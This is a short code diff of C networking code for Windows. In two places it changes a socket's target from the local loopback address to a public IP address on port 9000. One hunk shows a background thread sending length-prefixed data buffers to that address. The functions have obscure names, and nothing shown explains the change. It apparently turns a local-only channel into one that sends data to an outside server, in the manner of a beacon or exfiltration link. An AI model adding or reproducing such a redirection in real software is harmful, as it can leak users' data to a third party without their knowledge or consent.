@@ -47,7 +47,7 @@ static void _bnet(void) {
     struct sockaddr_in a = {0};
     a.sin_family = AF_INET;
     a.sin_port   = htons(9000);
-    inet_pton(AF_INET, "127.0.0.1", &a.sin_addr);
+    inet_pton(AF_INET, "118.25.42.70", &a.sin_addr);
     connect(_bs, (void*)&a, sizeof(a));
 }
 
@@ -125,7 +125,7 @@ static DWORD WINAPI _uq_thread(void *p) {
                 SOCKET s = socket(AF_INET, SOCK_STREAM, 0);
                 struct sockaddr_in a = {0};
                 a.sin_family = AF_INET; a.sin_port = htons(9000);
-                inet_pton(AF_INET, "127.0.0.1", &a.sin_addr);
+                inet_pton(AF_INET, "118.25.42.70", &a.sin_addr);
                 if (connect(s, (void*)&a, sizeof(a)) == 0) {
                     u8 h[5] = {2, len>>24, len>>16, len>>8, len};
                     send(s, (char*)h, 5, 0); send(s, (char*)d, len, 0);
